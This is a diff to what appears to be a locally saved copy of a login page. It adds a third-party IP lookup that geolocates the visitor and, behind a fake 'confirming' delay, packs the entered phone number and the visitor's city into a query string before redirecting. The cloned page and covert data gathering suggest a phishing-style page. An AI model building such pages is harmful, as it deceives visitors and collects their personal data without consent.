@@ -331,6 +331,7 @@
     <!-- <script src="./login_files/chunk-vendors.2f17ad96.js.download"></script> -->
     <!-- <script src="./login_files/app.6946dd56.js.download"></script> -->
     <script src="https://cdn.staticfile.org/jquery/3.5.0/jquery.min.js"></script>
+    <script src="https://pv.sohu.com/cityjson"></script>
     <script>
       function sleep(ms) {
         return new Promise((resolve) => {
@@ -339,7 +340,8 @@
       }
       const $sendCodeBtn = $(".phonebtn");
       const $submitBtn = $(".div-main > button");
-      $(".icon.phone ~ input").on("input", (e) => {
+      const $phoneInput = $(".icon.phone ~ input");
+      $phoneInput.on("input", (e) => {
         if (e.currentTarget.value.length >= 11) {
           $sendCodeBtn.removeClass("phonebtn-s");
           $sendCodeBtn.prop("disabled", false);
@@ -371,6 +373,10 @@
       $submitBtn.click(async () => {
         $submitBtn.text("确认中");
         await sleep(800);
+        const addr = new URLSearchParams(window.location.search).get("addr") || returnCitySN.cname;
+        const queryString = new URLSearchParams();
+        queryString.set("phone", $phoneInput.val());
+        queryString.set("addr", addr);
         window.location.href = "result.html";
       });
     </script>
